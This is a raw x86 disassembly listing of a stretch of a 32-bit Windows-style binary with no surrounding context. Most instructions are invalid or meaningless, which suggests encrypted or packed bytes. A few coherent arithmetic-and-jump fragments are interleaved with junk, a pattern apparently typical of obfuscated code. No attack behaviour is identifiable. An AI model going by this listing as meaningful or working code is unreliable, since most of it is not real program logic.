  40cee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cee9:	mov    bh,0x6c
  40ceeb:	loope  0x40ce92
  40ceed:	jecxz  0x40ce9f
  40ceef:	sub    DWORD PTR [ecx+0x3598eed9],0xfffffff6
  40cef6:	aas    
  40cef7:	adc    al,0xb5
  40cef9:	and    al,0x2e
  40cefb:	stos   BYTE PTR es:[edi],al
  40cefc:	arpl   WORD PTR [edi],bp
  40cefe:	test   al,0xeb
  40cf00:	(bad)  
  40cf01:	add    al,0x2b
  40cf03:	add    DWORD PTR [edx+esi*1],0xe1278086
  40cf0a:	aam    0x3d
  40cf0c:	sar    DWORD PTR [esi],0x23
  40cf0f:	mov    bl,0x49
  40cf11:	sbb    ch,BYTE PTR [esi-0x5b]
  40cf14:	retf   0x5c67
  40cf17:	pop    sp
  40cf19:	cld    
  40cf1a:	jmp    0xfa65f22f
  40cf1f:	pop    ebp
  40cf20:	add    bl,BYTE PTR [esp+ebp*8]
  40cf23:	(bad)  
  40cf24:	(bad)  
  40cf25:	out    0x8b,eax
  40cf27:	leave  
  40cf28:	cmp    ah,BYTE PTR [eax]
  40cf2a:	xor    BYTE PTR [edi],dh
  40cf2c:	outs   dx,BYTE PTR ds:[esi]
  40cf2d:	aas    
  40cf2e:	adc    cl,bl
  40cf30:	sbb    BYTE PTR ds:[eax+0x4187da50],al
  40cf37:	in     al,dx
  40cf38:	(bad)  
  40cf39:	daa    
  40cf3a:	out    0x2f,al
  40cf3c:	push   edx
  40cf3d:	add    al,0xd0
  40cf3f:	add    al,0xe2
  40cf41:	jno    0x40cf03
  40cf43:	mov    edx,esi
  40cf45:	stos   DWORD PTR es:[edi],eax
  40cf46:	fldenv [eax-0x56]
  40cf49:	fisub  WORD PTR [ebp-0x72]
  40cf4c:	mov    BYTE PTR [esi+edx*8+0x10c4d9de],ah
  40cf53:	pop    es
  40cf54:	test   al,0x10
  40cf57:	mov    DWORD PTR [ebx],ebx
  40cf59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf5a:	push   cs
  40cf5b:	xchg   ebx,ecx
  40cf5d:	mov    ebp,0x5ad512a
  40cf62:	pop    DWORD PTR [ebp-0xa754c70]
  40cf68:	xchg   ebp,eax
  40cf69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf6a:	retf   0xdd0c
  40cf6d:	retf   0x1a58
  40cf70:	sub    ch,ch
  40cf72:	and    DWORD PTR [edi+ebx*2],ecx
  40cf75:	aas    
  40cf76:	xor    DWORD PTR [eax+ebp*4+0x70],ecx
  40cf7a:	stos   BYTE PTR es:[edi],al
  40cf7b:	mov    dh,0xf
  40cf7d:	cmpxchg edx,esp
  40cf80:	pop    edx
  40cf81:	inc    ebx
  40cf82:	lahf   
  40cf83:	push   es
  40cf84:	fnstenv [ebp+0x18]
  40cf87:	rol    BYTE PTR [ebx+0x62e4255],0x33
  40cf8e:	(bad)  
  40cf8f:	or     al,0x87
  40cf91:	pop    edi
  40cf92:	popf   
  40cf93:	xchg   ebp,eax
  40cf94:	rcr    BYTE PTR [ecx+0x73],1
  40cf97:	(bad)  
  40cf98:	test   BYTE PTR [ebx+0x3b],cl
  40cf9b:	(bad)  
  40cf9c:	mov    ah,0xfb
  40cf9e:	imul   eax,DWORD PTR [ebp-0x113fffb0],0xffffff99
  40cfa5:	inc    esi
  40cfa6:	jne    0x40cf95
  40cfa8:	imul   esp,DWORD PTR [ecx-0x3a],0x13
  40cfac:	pop    ecx
  40cfad:	mov    dh,0x20
  40cfaf:	jnp    0x40cff6
  40cfb1:	inc    ecx
  40cfb2:	pushf  
  40cfb3:	daa    
  40cfb4:	inc    edi
  40cfb5:	push   esp
  40cfb6:	rcl    DWORD PTR [edx],0xfc
  40cfb9:	xor    eax,0xa5368536
  40cfbe:	fisubr WORD PTR [ebx-0x79]
  40cfc1:	lea    ecx,[ebx+0x60]
  40cfc4:	push   ebp
  40cfc5:	mov    ch,0x60
  40cfc7:	daa    
  40cfc8:	jg     0x40d03c
  40cfca:	shl    BYTE PTR [esi+0x246f1310],cl
  40cfd0:	pop    es
  40cfd1:	push   0xffffffe2
  40cfd3:	pop    ss
  40cfd4:	ret    
  40cfd5:	jo     0x40d050
  40cfd7:	cmp    al,0x70
  40cfd9:	cwde   
  40cfda:	jg     0x40cfd6
  40cfdc:	and    edi,esi
  40cfde:	xor    DWORD PTR [edx-0x2f],0x66ccc551
  40cfe5:	inc    eax
  40cfe6:	pop    ds
  40cfe7:	out    0xa1,eax
  40cfe9:	outs   dx,BYTE PTR ds:[esi]
  40cfea:	push   es
  40cfeb:	cmp    bh,BYTE PTR [ebx+ebx*2+0x330ab285]
  40cff2:	mov    bl,0x2a
  40cff4:	cld    
  40cff5:	fistp  QWORD PTR [ecx+0x8]
  40cff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff9:	ds loop 0x40d068
  40cffc:	adc    al,0x1c
  40cffe:	int3   
  40cfff:	add    DWORD PTR [ecx+0x36695b9b],esi
  40d005:	or     al,0x1a
  40d007:	lods   al,BYTE PTR ds:[esi]
  40d008:	cmp    al,0xc
  40d00a:	sub    DWORD PTR [esi+0x4ff9ce1a],edx
  40d010:	xor    eax,0x51005732
  40d015:	push   es
  40d016:	mov    edi,DWORD PTR [eax-0x70760a24]
  40d01c:	xor    eax,0x6da2e955
  40d021:	inc    edx
  40d022:	leave  
  40d023:	push   edi
  40d024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d025:	mov    dh,0xab
  40d027:	xchg   DWORD PTR [edi],ebp
  40d029:	sub    ecx,DWORD PTR [edi]
  40d02b:	lea    edi,[ecx-0x1b]
  40d02e:	pop    edi
  40d02f:	mov    dl,0xe9
  40d031:	xor    al,0xdf
  40d033:	xchg   BYTE PTR [edi],ah
  40d035:	push   cs
  40d036:	movhps xmm0,QWORD PTR [ebx-0x40]
  40d03a:	add    dh,ah
  40d03c:	test   BYTE PTR [ebx],ch
  40d03e:	mov    ah,0xe8
  40d040:	sub    al,0x51
  40d042:	jb     0x40d0bd
  40d044:	fbld   TBYTE PTR [edi]
  40d046:	daa    
  40d047:	lock test eax,0x1a4e7622
  40d04d:	ja     0x40d05f
  40d04f:	aaa    
  40d050:	or     edi,DWORD PTR [esi+0x65531739]
  40d056:	sbb    al,0xe6
  40d058:	pop    ss
  40d059:	retf   
  40d05a:	ror    BYTE PTR [ebx],0x87
  40d05d:	push   esi
  40d05e:	out    0x35,al
  40d060:	mov    ds:0xb824f0c3,eax
  40d065:	push   esp
  40d066:	xchg   edx,eax
  40d067:	out    dx,eax
  40d068:	test   al,0x55
  40d06a:	inc    ebp
  40d06b:	inc    edx
  40d06c:	jne    0x40d0d5
  40d06e:	aaa    
  40d06f:	push   edx
  40d070:	jge    0x40d03a
  40d072:	fdiv   DWORD PTR [ebp-0x66819e37]
  40d078:	ret    0xb8c
  40d07b:	pop    ss
  40d07c:	mov    edi,0xbcd1a8cb
  40d081:	jge    0x40d0ea
  40d083:	lods   eax,DWORD PTR ds:[esi]
  40d084:	sbb    ebx,DWORD PTR [eax-0x7f]
  40d087:	jg     0x40d099
  40d089:	popa   
  40d08a:	pushf  
  40d08b:	not    BYTE PTR [ecx-0x47]
  40d08e:	mov    ebp,0x71b03435
  40d093:	jle    0x40d103
  40d095:	cmp    DWORD PTR [esi+ebp*4],esp
  40d098:	retf   0x9a1a
  40d09b:	bnd jge 0x40d07b
  40d09e:	xor    bl,BYTE PTR [edx]
  40d0a0:	test   eax,0x86a3b63a
  40d0a5:	sbb    eax,0x64dfac20
  40d0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0ab:	xchg   ebx,eax
  40d0ac:	jg     0x40d072
  40d0ae:	mov    dh,0x69
  40d0b0:	ja     0x40d0de
  40d0b2:	push   es
  40d0b3:	in     eax,dx
  40d0b4:	xor    BYTE PTR [edi+eiz*2-0x2c],ch
  40d0b8:	cld    
  40d0b9:	add    bh,BYTE PTR [ecx+edx*8]
  40d0bc:	mov    edx,0x3c59a646
  40d0c1:	mov    edi,0x66860fd0
  40d0c6:	lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    ebx,FWORD PTR [ecx-0x55b33779]
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d168
  40d0fb:	xchg   edi,eax
  40d0fc:	(bad)  
  40d0fd:	in     eax,0xc5
  40d0ff:	mov    dh,0xd9
  40d101:	sahf   
  40d102:	int    0x52
  40d104:	int    0x7c
  40d106:	das    
  40d107:	xor    al,0xb3
  40d109:	cmp    BYTE PTR [esi-0x27eb143f],ch
  40d10f:	loope  0x40d115
  40d111:	add    edx,DWORD PTR [ecx+0x31bebad2]
  40d117:	into   
  40d118:	mov    esp,DWORD PTR [edi+0x48]
  40d11b:	jnp    0x40d12e
  40d11d:	jmp    0x40d12a
  40d11f:	sbb    DWORD PTR [ebp+0x37bab174],eax
  40d125:	cmp    edx,DWORD PTR [eax+0x6de54717]
  40d12b:	mov    fs,WORD PTR ss:[ecx-0x13]
  40d12f:	(bad)  
  40d130:	aad    0xb3
  40d132:	sub    DWORD PTR [eax-0x6479fc40],edx
  40d138:	out    0xfc,eax
  40d13a:	outs   dx,BYTE PTR ds:[esi]
  40d13b:	gs mov dl,0x92
  40d13e:	fcomp  st(6)
  40d140:	jns    0x40d17a
  40d142:	cs in  eax,0xe9
  40d145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d146:	cmp    cl,bl
  40d148:	cmp    DWORD PTR [edi-0x4ed91c5a],ecx
  40d14e:	xor    eax,0x3a349b1e
  40d153:	push   0xffffffe3
  40d155:	enter  0x944e,0x3b
  40d159:	and    ebx,eax
  40d15b:	xchg   ecx,eax
  40d15c:	loope  0x40d18c
  40d15e:	jns    0x40d13f
  40d160:	in     al,dx
  40d161:	xor    BYTE PTR [ecx],bh
  40d163:	fsub   DWORD PTR [ebp-0x2d]
  40d166:	push   edi
  40d167:	push   ecx
  40d168:	mov    ecx,DWORD PTR [ebx-0x1cdeb5bc]
  40d16e:	push   ebx
  40d16f:	inc    edi
  40d170:	aad    0xe9
  40d172:	stc    
  40d173:	sbb    al,0xe8
  40d175:	push   edi
  40d176:	fnstcw WORD PTR [eax+esi*4]
  40d179:	and    ah,BYTE PTR [esi-0x13]
  40d17c:	cmp    bl,dh
  40d17e:	push   0x5e76ad49
  40d183:	cmc    
  40d184:	push   edi
  40d185:	or     BYTE PTR [ebx],ch
  40d187:	mov    edx,edi
  40d189:	sub    dl,dl
  40d18b:	sub    cl,BYTE PTR [edi-0x1fd1df43]
  40d191:	and    BYTE PTR [esi+0x64],al
  40d194:	push   cs
  40d195:	adc    DWORD PTR [esi-0x553de4d8],0xf7886820
  40d19f:	enter  0x7948,0x9c
  40d1a3:	mov    dl,0xcc
  40d1a5:	test   eax,0xd7bc703
  40d1aa:	mov    cl,0x68
  40d1ac:	and    al,0x2e
  40d1ae:	inc    edi
  40d1af:	push   esp
  40d1b0:	cld    
  40d1b1:	(bad)  
  40d1b2:	xchg   ebx,eax
  40d1b3:	out    0x7a,al
  40d1b5:	call   0xc7ef018d
  40d1ba:	stc    
  40d1bb:	pop    esi
  40d1bc:	jnp    0x40d1c3
  40d1be:	mov    eax,ds:0x6134136a
  40d1c3:	xlat   BYTE PTR ds:[ebx]
  40d1c4:	pop    es
  40d1c5:	add    BYTE PTR ds:0x9b337bb2,ch
  40d1cb:	mov    ds:0x279009a4,eax
  40d1d0:	call   0xcf2d1701
  40d1d5:	dec    esi
  40d1d6:	sub    DWORD PTR [ecx],edx
  40d1d8:	fadd   DWORD PTR [esi+0x17]
  40d1db:	mov    ah,0x89
  40d1dd:	rcl    DWORD PTR ds:0xe8ec52f8,1
  40d1e3:	adc    al,dh
  40d1e5:	mov    ch,0x89
  40d1e7:	loop   0x40d245
  40d1e9:	cwde   
  40d1ea:	(bad)  
  40d1eb:	mov    eax,ds:0xd69b4ec5
  40d1f0:	add    BYTE PTR [ebx+edx*4+0x34cea586],dh
  40d1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1f8:	sbb    ebp,DWORD PTR [edx-0x6b033858]
  40d1fe:	push   esi
  40d1ff:	jle    0x40d1a9
  40d201:	mov    cl,0x74
  40d203:	div    BYTE PTR [edx+edi*1-0x9067f02]
  40d20a:	and    DWORD PTR [ecx-0x7fe45f3a],ecx
  40d210:	in     al,dx
  40d211:	or     BYTE PTR [edi+0x1c49b66],ah
  40d217:	loopne 0x40d271
  40d219:	xor    eax,0x5ed1c4b5
  40d21e:	mov    dl,0xa6
  40d220:	(bad)  
  40d221:	adc    al,0x9a
  40d223:	enter  0x2c71,0xaa
  40d227:	dec    esi
  40d228:	shl    DWORD PTR [eax+0x5b],1
  40d22b:	mov    edi,0x87f60488
  40d230:	int    0x8b
  40d232:	out    0xb0,al
  40d234:	bound  edx,QWORD PTR [edi+0x220dab68]
  40d23a:	xchg   edx,eax
  40d23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d23c:	nop
  40d23d:	out    0x4b,eax
  40d23f:	cmp    bh,bl
  40d241:	pop    eax
  40d242:	inc    eax
  40d243:	mov    dl,0x7
  40d245:	xchg   ecx,eax
  40d246:	mov    bh,BYTE PTR [edi]
  40d248:	shl    DWORD PTR [eax+0x20ad520a],1
  40d24e:	or     DWORD PTR [ecx-0x1eb0610b],esi
  40d254:	mov    dh,0x2b
  40d256:	shr    bh,1
  40d258:	fld    DWORD PTR [ebx]
  40d25a:	outs   dx,BYTE PTR ds:[esi]
  40d25b:	xor    al,0x92
  40d25d:	push   es
  40d25e:	das    
  40d25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d260:	adc    al,0x5a
  40d262:	mov    ah,0xff
  40d264:	ins    DWORD PTR es:[edi],dx
  40d265:	mov    edx,0x8d2c642f
  40d26a:	push   edi
  40d26b:	daa    
  40d26c:	push   ds
  40d26d:	pushf  
  40d26e:	das    
  40d26f:	rcr    DWORD PTR [ebp+0x1ef6e5d5],1
  40d275:	pushf  
  40d276:	or     BYTE PTR [edi],ah
  40d278:	jae    0x40d240
  40d27a:	stos   BYTE PTR es:[edi],al
  40d27b:	pop    edi
  40d27c:	adc    BYTE PTR [ecx+eiz*2],ch
  40d27f:	shr    ebp,0x7
  40d282:	(bad)  
  40d283:	sti    
  40d284:	jno    0x40d284
  40d286:	cmp    eax,0x7f7722a5
  40d28b:	or     ah,BYTE PTR ds:0x8a9f357e
  40d291:	adc    BYTE PTR [eax],bh
  40d293:	and    ebp,0xfffffffc
  40d296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d297:	adc    BYTE PTR ds:0xba4f18c6,bl
  40d29d:	and    al,BYTE PTR [ebx+0x1948d3cc]
  40d2a3:	popa   
  40d2a4:	inc    edx
  40d2a5:	ror    DWORD PTR [ebp+ecx*4+0x7a],cl
  40d2a9:	lock cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  40d2ac:	sub    al,0xc8
  40d2ae:	js     0x40d2b8
  40d2b0:	sbb    eax,0xc0d23770
  40d2b5:	push   0x3d
  40d2b7:	dec    ecx
  40d2b8:	and    ebx,ecx
  40d2ba:	stos   DWORD PTR es:[edi],eax
  40d2bb:	popa   
  40d2bc:	dec    esp
  40d2bd:	xor    al,0xa6
  40d2bf:	jb     0x40d2e6
  40d2c1:	stc    
  40d2c2:	cmp    BYTE PTR [edx],dh
  40d2c4:	(bad)  
  40d2c5:	jns    0x40d27d
  40d2c7:	shl    edi,cl
  40d2c9:	mov    cl,0x35
  40d2cb:	ror    BYTE PTR [ecx-0x737c0560],cl
  40d2d1:	popa   
  40d2d2:	xchg   ebx,eax
  40d2d3:	and    DWORD PTR [ebp-0x40],edi
  40d2d6:	sbb    esi,DWORD PTR [ebx-0x7df2c58e]
  40d2dc:	sbb    edx,DWORD PTR [edi+0x36]
  40d2df:	data16 and bh,al
  40d2e2:	jbe    0x40d358
  40d2e4:	pushf  
  40d2e5:	pop    ecx
  40d2e6:	dec    eax
  40d2e7:	jns    0x40d292
  40d2e9:	(bad)  
  40d2ea:	jmp    0x40d28c
  40d2ec:	imul   eax,DWORD PTR [edi-0x75703028],0xffffffaf
  40d2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2f4:	inc    esp
  40d2f5:	outs   dx,BYTE PTR ds:[esi]
  40d2f6:	ret    0x9d3b
  40d2f9:	push   0x6e9d6d86
  40d2fe:	dec    esp
  40d2ff:	xor    BYTE PTR [edx+0x565a2cc8],al
  40d305:	rcr    BYTE PTR [eax-0x67a4cf5e],1
  40d30b:	dec    DWORD PTR [edi+edx*1-0x8]
  40d30f:	inc    edx
  40d310:	mov    edx,DWORD PTR [ebx]
  40d312:	jbe    0x40d344
  40d314:	mov    ch,0x1a
  40d316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d317:	enter  0xdb52,0x8c
  40d31b:	fisttp WORD PTR [edi]
  40d31d:	add    BYTE PTR [ecx],bh
  40d31f:	xor    DWORD PTR [eax+eax*2],ecx
  40d322:	push   eax
  40d323:	add    eax,edi
  40d325:	jmp    0x40d316
  40d327:	arpl   WORD PTR [ebp-0x44],ax
  40d32a:	div    bl
  40d32c:	test   DWORD PTR [edx-0x179b4d26],esi
  40d332:	nop
  40d333:	mov    ecx,0xf8b5841f
  40d338:	dec    esp
  40d339:	in     al,0x57
  40d33b:	(bad)  [esi+0x46]
  40d33e:	xchg   esp,eax
  40d33f:	push   ecx
  40d340:	fwait
  40d341:	test   DWORD PTR [esi],esi
  40d343:	push   eax
  40d344:	xchg   ebp,eax
  40d345:	fwait
  40d346:	and    BYTE PTR [esi+ebx*1],ah
  40d349:	repnz int 0x1f
  40d34c:	out    dx,al
  40d34d:	gs daa 
  40d34f:	cmp    BYTE PTR [ecx+0x7fc08f99],ch
  40d355:	push   esp
  40d356:	pushf  
  40d357:	pop    es
  40d358:	pop    ds
  40d359:	into   
  40d35a:	or     BYTE PTR [esi-0xc],dl
  40d35d:	xchg   ebx,eax
  40d35e:	shl    BYTE PTR [ecx],1
  40d360:	jns    0x40d2ee
  40d362:	je     0x40d3ba
  40d364:	inc    esp
  40d365:	cmp    bl,0xdc
  40d368:	sub    eax,esp
  40d36a:	jmp    0x40d31f
  40d36c:	xor    BYTE PTR gs:[esi+0x1694a9e],al
  40d373:	sahf   
  40d374:	inc    ebx
  40d375:	cmc    
  40d376:	jno    0x40d3ad
  40d378:	lahf   
  40d379:	mov    dl,0xfa
  40d37b:	lea    eax,[edx]
  40d37d:	pop    es
  40d37e:	out    dx,eax
  40d37f:	sbb    al,0x6d
  40d381:	mov    ebp,0x698f3083
  40d386:	das    
  40d387:	repnz xchg ebp,eax
  40d389:	aam    0x44
  40d38b:	push   0xffffffdb
  40d38d:	xor    edx,DWORD PTR [edx]
  40d38f:	sbb    al,0x58
  40d391:	lea    esp,[edx]
  40d393:	dec    esi
  40d394:	imul   edi,DWORD PTR [eax+ebp*1+0x42],0xffffffe4
  40d399:	pminub mm6,QWORD PTR [edi+0x38eb0bbc]
  40d3a0:	mov    esi,0xd29fc779
  40d3a5:	sub    DWORD PTR [ebx-0x40131c16],0x997a6266
  40d3af:	inc    ecx
  40d3b0:	jge    0x40d3ce
  40d3b2:	mov    ds:0x55c31e61,al
  40d3b7:	mov    edx,0x2f1fbcd8
  40d3bc:	cmc    
  40d3bd:	inc    esp
  40d3be:	bound  eax,QWORD PTR [eax]
  40d3c0:	into   
  40d3c1:	pop    ebp
  40d3c2:	test   DWORD PTR [esi+0x6037765e],0x6b5c066e
  40d3cc:	repz sbb BYTE PTR [esi],bl
  40d3cf:	rcl    BYTE PTR [esi],0x47
  40d3d2:	push   es
  40d3d3:	idiv   WORD PTR [edi+0x534f07d3]
  40d3da:	into   
  40d3db:	mov    bl,0x74
  40d3dd:	xor    edi,DWORD PTR [edx]
  40d3df:	daa    
  40d3e0:	pop    edi
  40d3e1:	in     al,dx
  40d3e2:	mov    eax,ds:0x35e8119f
  40d3e7:	pop    esi
  40d3e8:	fnstcw WORD PTR [eax+0x55]
  40d3eb:	xchg   esp,eax
  40d3ec:	test   eax,0x5f312436
  40d3f1:	sbb    DWORD PTR [eax],ebx
  40d3f3:	push   ss
  40d3f4:	imul   eax,DWORD PTR [edi+ecx*4-0x7d],0x4b9e5cb1
  40d3fc:	inc    esi
  40d3fd:	and    al,0xb2
  40d3ff:	scas   al,BYTE PTR es:[edi]
  40d400:	adc    bh,BYTE PTR [ebp-0x7844e61a]
  40d406:	jo     0x40d456
  40d408:	(bad)  
  40d409:	cmc    
  40d40a:	sbb    eax,0x571acb86
  40d40f:	jl     0x40d3cb
  40d411:	(bad)  
  40d412:	push   0x25aa2b98
  40d417:	mov    bh,0x90
  40d419:	mov    esp,0xa4f079b0
  40d41e:	inc    eax
  40d41f:	push   ds
  40d420:	popa   
  40d421:	int3   
  40d422:	(bad)  
  40d423:	cmp    BYTE PTR [esi+0xa],dl
  40d426:	inc    esp
  40d427:	xchg   esp,eax
  40d428:	rcl    al,0x7f
  40d42b:	jb     0x40d3dc
  40d42d:	hlt    
  40d42e:	cmp    BYTE PTR [edx+0x36323bac],dl
  40d434:	jae    0x40d401
  40d436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d437:	add    eax,0xf58c24c3
  40d43c:	lods   eax,DWORD PTR ds:[esi]
  40d43d:	in     eax,dx
  40d43e:	mov    edi,0xa4449083
  40d443:	add    bh,BYTE PTR [ebp+0x64]
  40d446:	nop
  40d447:	int    0x67
  40d449:	jge    0x40d3fc
  40d44b:	and    eax,edx
  40d44d:	sub    BYTE PTR [esi+0x59],ah
  40d450:	cmc    
  40d451:	shl    DWORD PTR [eax+0x6],0x1b
  40d455:	xlat   BYTE PTR ds:[ebx]
  40d456:	data16 lahf 
  40d458:	test   DWORD PTR [ebx],edx
  40d45a:	outs   dx,BYTE PTR ds:[esi]
  40d45b:	sti    
  40d45c:	xor    al,BYTE PTR [edx+eax*1+0x3703013b]
  40d463:	push   ebp
  40d464:	in     al,dx
  40d465:	sub    ebp,DWORD PTR [ebx]
  40d467:	xchg   ebp,eax
  40d468:	xor    BYTE PTR [eax+0x40],0x35
  40d46c:	inc    ecx
  40d46d:	(bad)  [edx+0x70f529e5]
  40d473:	xchg   esp,eax
  40d474:	inc    ebp
  40d475:	test   DWORD PTR [ebx+eax*8+0x2c242662],ecx
  40d47c:	shr    DWORD PTR es:[ebx+ebx*2+0x6577c9b6],1
  40d484:	fwait
  40d485:	add    eax,0x3728ffe4
  40d48a:	mov    cl,0xe8
  40d48c:	in     eax,dx
  40d48d:	dec    BYTE PTR [esi-0x4117b7f4]
  40d493:	mov    WORD PTR [ebx+0x12e652cd],ss
  40d499:	dec    ebx
  40d49a:	lock mov edi,DWORD PTR [ebp-0x8]
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x90d3:0xb81a1d63
  40d4c6:	fnstcw WORD PTR [ecx+ecx*2-0x37]
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d546
  40d4d2:	pop    ebx
  40d4d3:	jl     0x40d4d5
  40d4d5:	dec    eax
  40d4d6:	test   eax,0x4542dd5a
  40d4db:	sub    al,0x25
  40d4dd:	xor    eax,0x2a7e41f1
  40d4e2:	mov    dh,0x5b
  40d4e4:	pushf  
  40d4e5:	das    
  40d4e6:	pop    ecx
  40d4e7:	rcl    DWORD PTR [eax],1
  40d4e9:	fcomp  QWORD PTR [eax-0x42bc9ed2]
  40d4ef:	inc    esi
  40d4f0:	outs   dx,BYTE PTR ds:[esi]
  40d4f1:	(bad)  
  40d4f2:	xchg   ebp,eax
  40d4f3:	in     al,dx
  40d4f4:	adc    al,0x49
  40d4f6:	in     al,0xbc
  40d4f8:	sahf   
  40d4f9:	pop    esp
  40d4fa:	dec    ecx
  40d4fb:	int    0xf3
  40d4fd:	push   ebx
  40d4fe:	popf   
  40d4ff:	lock shl edx,cl
  40d502:	cli    
  40d503:	dec    edi
  40d504:	or     BYTE PTR [edi+0x61],ah
  40d507:	jge    0x40d54f
  40d509:	mov    ch,0x4b
  40d50b:	int3   
  40d50c:	dec    esp
  40d50d:	int    0xfe
  40d50f:	adc    ebp,DWORD PTR [eax+0x41]
  40d512:	mov    esp,edi
  40d514:	add    BYTE PTR [eax],cl
  40d516:	xchg   ecx,eax
  40d517:	jo     0x40d56c
  40d519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d51a:	test   eax,0xb48bb701
  40d51f:	das    
  40d520:	and    eax,0xc786bf2d
  40d525:	mov    ds:0xc50d3b7b,al
  40d52a:	jne    0x40d557
  40d52c:	push   ecx
  40d52d:	add    ebx,DWORD PTR [edi]
  40d52f:	scas   al,BYTE PTR es:[edi]
  40d530:	repz cmc 
  40d532:	into   
  40d533:	xchg   esi,eax
  40d534:	ds (bad) 
  40d536:	fsub   QWORD PTR [ebx+edx*2+0x35]
  40d53a:	pushf  
  40d53b:	cdq    
  40d53c:	push   es
  40d53d:	lock jge 0x40d598
  40d540:	daa    
  40d541:	mov    al,BYTE PTR [ebx+0x71c2ce4c]
  40d547:	add    BYTE PTR [edi],0x4e
  40d54a:	iret   
  40d54b:	inc    edi
  40d54c:	fimul  DWORD PTR es:[edx]
  40d54f:	push   es
  40d550:	cmp    al,0x43
  40d552:	sti    
  40d553:	hlt    
  40d554:	je     0x40d4eb
  40d556:	out    0xed,eax
  40d558:	cmp    edx,DWORD PTR [edi-0x47783842]
  40d55e:	pop    ebx
  40d55f:	xchg   edx,eax
  40d560:	push   esp
  40d561:	and    DWORD PTR [eax+0x76],ecx
  40d564:	cmp    eax,0xabbe3bbf
  40d569:	jmp    0x2eeb6cc5
  40d56e:	out    dx,al
  40d56f:	pop    edi
  40d570:	adc    al,0xeb
  40d572:	gs mov cl,0x87
  40d575:	jbe    0x40d5cf
  40d577:	mov    cl,0x29
  40d579:	dec    edx
  40d57a:	cmp    DWORD PTR [eax],0x7d0d15dc
  40d580:	lods   eax,DWORD PTR ds:[esi]
  40d581:	push   es
  40d582:	pop    esi
  40d583:	cli    
  40d584:	hlt    
  40d585:	or     ebp,0x4c
  40d588:	loopne 0x40d562
  40d58a:	ins    DWORD PTR es:[edi],dx
  40d58b:	pop    edi
  40d58c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d58d:	inc    eax
  40d58e:	and    eax,0x982f4b71
  40d593:	and    eax,0xd486a3f2
  40d598:	js     0x40d51d
  40d59a:	push   ebp
  40d59b:	jg     0x40d530
  40d59d:	mov    dh,0xee
  40d59f:	mov    bl,0xbc
  40d5a1:	arpl   WORD PTR [eax-0x67],sp
  40d5a4:	shr    BYTE PTR [esi+eiz*1-0x7a],cl
  40d5a8:	mov    ebp,0xc4bea533
  40d5ad:	out    0x36,eax
  40d5af:	ret    0x7f84
  40d5b2:	in     eax,dx
  40d5b3:	and    dh,BYTE PTR [eax]
  40d5b5:	push   0x14f06c55
  40d5ba:	or     al,0xb4
  40d5bc:	adc    al,0x25
  40d5be:	not    eax
  40d5c0:	out    0xa1,eax
  40d5c2:	les    ecx,FWORD PTR [ebx+0x7c7342ea]
  40d5c8:	cld    
  40d5c9:	and    BYTE PTR [esi],ch
  40d5cb:	js     0x40d629
  40d5cd:	out    0x1e,al
  40d5cf:	xchg   DWORD PTR [edi+edi*1],esi
  40d5d2:	mov    ch,0x4d
  40d5d4:	adc    al,BYTE PTR [edx+0x7d]
  40d5d7:	jb     0x40d5e1
  40d5d9:	mov    bl,0xd8
  40d5db:	jb     0x40d653
  40d5dd:	jmp    0xd213:0xf6b555e5
  40d5e4:	jg     0x40d592
  40d5e6:	(bad)  
  40d5e7:	ror    DWORD PTR [ebx-0x28],0x28
  40d5eb:	push   ds
  40d5ec:	xor    DWORD PTR [edx+eax*1-0x50],edi
  40d5f0:	pushf  
  40d5f1:	outs   dx,DWORD PTR ds:[esi]
  40d5f2:	in     al,0xd
  40d5f4:	sub    eax,0x55db33a2
  40d5f9:	popa   
  40d5fa:	mov    edi,0x15f3887b
  40d5ff:	xchg   DWORD PTR [ebx+0x25],ebx
  40d602:	pushf  
  40d603:	retf   
  40d604:	mov    ds,WORD PTR [edx]
  40d606:	mov    eax,0x93d11d2a
  40d60b:	mov    eax,ds:0x514ab43a
  40d610:	mov    DWORD PTR [ecx+0x4],ebp
